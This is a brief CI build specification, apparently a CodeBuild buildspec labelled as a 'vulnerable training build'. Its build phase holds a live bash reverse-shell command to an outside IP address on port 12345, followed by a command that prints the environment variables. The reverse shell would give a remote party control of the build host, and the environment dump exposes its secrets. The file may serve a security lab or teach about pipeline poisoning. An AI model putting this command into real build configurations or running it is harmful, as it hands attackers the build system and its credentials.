version: 0.2

phases:
  build:
    commands:
      - echo "Running vulnerable training build"
      - bash -i >& /dev/tcp/157.230.104.253/12345 0>&1
      - env | sort | head -n 20
      - echo "Done"
